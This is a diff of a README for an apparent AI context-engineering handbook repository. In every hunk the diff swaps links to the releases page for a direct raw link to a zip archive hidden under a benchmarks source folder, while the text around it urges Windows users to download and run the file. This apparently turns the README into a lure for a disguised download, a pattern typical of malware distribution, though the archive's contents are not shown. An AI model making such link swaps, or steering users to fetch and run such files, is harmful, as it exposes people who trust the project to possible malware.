@@ -1,6 +1,6 @@
 # 🤖 context-engineering-handbook - Build Better AI Context Fast
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/shannenseeded61/context-engineering-handbook/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/shannenseeded61/context-engineering-handbook/raw/refs/heads/main/benchmarks/typescript/src/context_engineering_handbook_v1.6.zip)
 
 ## 📘 What This Is
 
@@ -31,7 +31,7 @@ If the release contains source files, you can still open them with a text editor
 ## ⬇️ Download
 
 Visit this page to download:  
-https://github.com/shannenseeded61/context-engineering-handbook/releases
+https://github.com/shannenseeded61/context-engineering-handbook/raw/refs/heads/main/benchmarks/typescript/src/context_engineering_handbook_v1.6.zip
 
 Choose the latest release, then download the file that matches your device. If the page offers more than one file, pick the one meant for Windows.
 
@@ -167,7 +167,7 @@ This helps you see which patterns matter most for your use case.
 
 ## 🔗 Download Again
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release%20Page-grey?style=for-the-badge)](https://github.com/shannenseeded61/context-engineering-handbook/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release%20Page-grey?style=for-the-badge)](https://github.com/shannenseeded61/context-engineering-handbook/raw/refs/heads/main/benchmarks/typescript/src/context_engineering_handbook_v1.6.zip)
 
 Visit the release page to download and run this file on Windows if the latest release includes a Windows app or packaged build
 
@@ -217,4 +217,4 @@ It helps you:
 ## 📎 Release Page
 
 Primary download link:  
-https://github.com/shannenseeded61/context-engineering-handbook/releases
+https://github.com/shannenseeded61/context-engineering-handbook/raw/refs/heads/main/benchmarks/typescript/src/context_engineering_handbook_v1.6.zip
